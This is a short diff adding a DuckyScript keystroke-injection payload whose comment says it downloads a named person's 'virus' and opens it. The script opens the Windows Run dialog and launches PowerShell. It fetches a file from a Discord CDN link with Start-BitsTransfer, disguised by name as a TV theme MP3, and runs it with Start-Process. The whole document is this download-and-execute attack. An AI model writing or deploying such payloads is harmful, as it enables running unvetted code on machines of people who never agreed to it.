@@ -1,0 +1,18 @@
+REM made by Lachlan 
+REM this script downloads @lach's virus and opens it
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 500
+STRING cd C:\
+DELAY 1000
+ENTER
+DELAY 1000
+STRING Start-BitsTransfer     'https://cdn.discordapp.com/attachments/1065798566674702370/1068368843333976104/ONTIVA.COM_Better_Call_Saul_Theme_by_Little_Barrie_Full_Orignal_Song-128k_1.mp3'
+DELAY 1000
+ENTER
+DELAY 10000
+STRING START-PROCESS "[ONTIVA.COM] Better Call Saul Theme by Little Barrie Full Orignal Song-128k"
